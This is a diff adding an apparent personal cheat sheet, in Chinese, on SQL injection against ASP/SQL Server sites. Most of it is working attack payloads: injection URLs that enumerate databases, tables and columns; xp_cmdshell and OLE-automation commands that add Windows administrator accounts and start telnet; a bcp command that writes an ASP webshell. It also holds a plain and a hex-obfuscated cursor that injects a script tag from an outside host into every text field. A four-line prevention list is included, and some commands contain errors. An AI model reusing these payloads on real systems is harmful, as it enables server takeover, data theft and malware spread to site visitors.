@@ -1,0 +1,216 @@
+HTTP://xxx.xxx.xxx/abc.asp?p=YY&n ... db_name()>0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；
+
+ACCESS的系统表是msysobjects,且在WEB环境下没有访问权限，而SQL-SERVER的系统表是sysobjects,在WEB环境下有访问权限。对于以下两条语句：
+①HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from sysobjects)>0
+②HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from msysobjects)>0
+若数据库是SQL-SERVE，则第一条，abc.asp一定运行正常，第二条则异常；若是ACCESS则两条都会异常。
+
+WAF防御体系是什么？
+nmap扫描
+
+发现如果改变用户名的输入：admin' or '1'='1，弹出的消息是密码错误，而直接随便输一个帐号random，则弹出帐号不存在。说明了这个登入页面没有对输入进行过滤。
+
+WebScarab
+
+sqlmap
+
+union+(select+1，2，3，4，5，6+from+admin)
+若当前连接数据的帐号具有SA权限，且master.dbo.xp_cmdshell扩展存储过程(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可以通过以下几种方法完全控制，以后的所有步骤都可以省
+1、HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... er>0 abc.asp执行异常但可以得到当前连接数据库的用户名(若显示dbo则代表SA)。
+2、HTTP://xxx.xxx.xxx/abc.asp?p=YY ... me()>0 abc.asp执行异常但可以得到当前连接的数据库名。
+3、HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net user aaa bbb /add”-- (master是SQL-SERVER的主数据库；名中的分号表示SQL-SERVER执行完分号前的语句名，继续执行其后面的语句；“—”号是注解，表示其后面的所有内容仅为注释，系统并不执行)可以直接增加操作系统帐户aaa,密码为bbb。
+4、 HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net localgroup administrators aaa /add”-- 把刚刚增加的帐户aaa加到administrators组中。
+5、 HTTP://xxx.xxx.xxx/abc.asp?p=YY；backuup database 数据库名 to disk='c:inetpubwwwrootsave.db' 则把得到的数据内容全部备份到WEB目录下，再用HTTP把此文件下载(当然首选要知道WEB虚拟目录)。
+6、通过复制CMD创建UNICODE漏洞
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;exe ... dbo.xp_cmdshell “copy c:winntsystem32cmd.exe c:inetpubscriptscmd.exe” 便制造了一个UNICODE漏洞，通过此漏洞的利用方法，便完成了对整个计算机的控制(当然首选要知道WEB虚拟目录)。
+
+0day
+ssh
+
+a)   利用xp_availablemedia来获得当前所有驱动器,并存入temp表中
+
+;insert temp exec master.dbo.xp_availablemedia;--
+
+b)   利用xp_subdirs获得子目录列表,并存入temp表中
+
+;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
+
+c)   利用xp_dirtree可以获得“所有”子目录的目录树结构,并存入temp表中
+
+;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （实验成功）
+
+d)   利用 bcp 命令将表内容导成文件
+
+即插入木马文本，然后导出存为文件。比如导出为asp文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）
+
+Exec master..xp_cmdshell N'BCP "select * from SchoolMarket.dbo.GoodsStoreData;" queryout c:/inetpub/wwwroot/runcommand.asp -w -S"localhost" -U"sa" -P"123"'
+
+(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)
+
+1=(select IS_SRVROLEMEMBER('sysadmin'))得到当前用户是否具有该权限。
+
+d)   在数据库内添加一个hax用户，默认密码是空
+
+;exec sp_addlogin'hax';--
+
+e)   给hax设置密码 (null是旧密码，password是新密码，user是用户名)
+
+;exec master.dbo.sp_password null,password,username;--
+
+f)   将hax添加到sysadmin组
+
+;exec master.dbo.sp_addsrvrolemember 'hax' ,'sysadmin';--
+
+a)   判断xp_cmdshell扩展存储过程是否存在
+
+SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell'
+
+b)   恢复xp_cmdshell扩展存储过程
+
+Exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';
+
+开启后使用xp_cmdshell还会报下面错误：
+
+SQL Server 阻止了对组件 'xp_cmdshell' 的过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
+
+通过执行下面语句进行设置：
+
+-- 允许配置高级选项
+
+EXEC sp_configure 'show advanced options', 1
+
+GO
+
+-- 重新配置
+
+RECONFIGURE
+
+GO
+
+-- 启用xp_cmdshell
+
+EXEC sp_configure 'xp_cmdshell', 0
+
+GO
+
+--重新配置
+
+RECONFIGURE
+
+GO
+
+c)   禁用xp_cmdshell扩展存储过程
+
+Exec master.dbo.sp_dropextendedproc 'xp_cmdshell';
+
+d)   添加windows用户：
+
+Exec xp_cmdshell 'net user awen /add';
+
+e)   设置好密码：
+
+Exec xp_cmdshell 'net user awen password';
+
+f)   提升到管理员：
+
+Exec xp_cmdshell 'net localgroup administrators awen /add';
+
+g)   开启telnet服务：
+
+Exec xp_cmdshell 'net start tlntsvr'
+
+7)   没有xp_cmdshell扩展程序，也可创建Windows帐户的办法.
+
+(本人windows7系统，测试下面SQL语句木有效果)
+
+declare @shell int ;
+
+execsp_OAcreate 'w script .shell',@shell output ;
+
+execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen /add';
+
+execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net user awen 123';
+
+execsp_OAmethod @shell,'run',null,'C:\Windows\System32\cmd.exe /c net localgroup administrators awen /add';
+
+在使用的时候会报如下错：
+
+SQL Server 阻止了对组件 'Ole Automation Procedures' 的过程 'sys.sp_OACreate'、'sys.sp_OAMethod' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'Ole Automation Procedures'。有关启用 'Ole Automation Procedures' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
+
+        解决办法：
+
+sp_configure 'show advanced options', 1;
+
+GO
+
+RECONFIGURE;
+
+GO
+
+sp_configure 'Ole Automation Procedures', 1;
+
+GO
+
+RECONFIGURE;
+
+GO
+
+
+
+向当前数据库的每个表的每个字段插入一段恶意脚本
+Declare @T Varchar(255),@C Varchar(255)
+
+Declare Table_Cursor Cursor For
+
+Select A.Name,B.Name
+
+From SysobjectsA,Syscolumns B Where A.Id=B.Id And A.Xtype='u' And (B.Xtype=99 Or B.Xtype=35 Or B.Xtype=231 Or B.Xtype=167) 
+
+Open Table_Cursor
+
+Fetch Next From  Table_Cursor Into @T,@C 
+
+While(@@Fetch_Status=0) 
+
+Begin
+
+Exec('update ['+@T+'] Set ['+@C+']=Rtrim(Convert(Varchar(8000),['+@C+']))+''<script src=http://8f8el3l.cn/0.js></script>''')
+
+    Fetch Next From Table_Cursor Into @T,@C
+
+End
+
+Close Table_Cursor
+
+DeallocateTable_Cursor
+
+hex编码 意思与上相同
+dEcLaRe @s vArChAr(8000) sEt @s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72; 
+eXeC(@s);--
+
+预防：
+1.给web访问设置sql中的最低权限。
+2.<customErrors mode="On">不会出现错误信息。
+3.对参数进行校验，类型检测、长度验证
+4.参数化sql查询
+
+
+绕过引号检测 xtype=char(85)
+select * from master.dbo.sysdatabases 就可以查询出所有的库名.
+select * from ChouYFD.dbo.sysobjects where xtype=“U“ 这样就可以列出库名称是：ChouYFD中所有的表名
+
+爆库名
+http://www.AAA.com/jump.asp?id=3400 and 0<>(select count(*) _ from master.dbo.sysdatabases where name>1 and dbid=6)
+dbid 的值从1到5，是系统用了。所以用户自己建的一定是从6开始的。并且我们提交了 name>1 NAME字段是一个字符型的字段和数字比较会出错.
+
+爆表名
+http://www.AAA.com/jump.asp?id=3400 and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=“U“)
+爆表ID
+select *  from sysobjects where xtype='u' and uid>(str(id)) and name='company' //id 1749581271
+爆列名
+http://www.AAA.com/jump.asp?id=3400 and 0<>(select top 1 name from football.dbo.syscolumns where id=1749581271)
+
+select User_name()
+select Db_name()
+select HOST_NAME()
+select @@VERSION
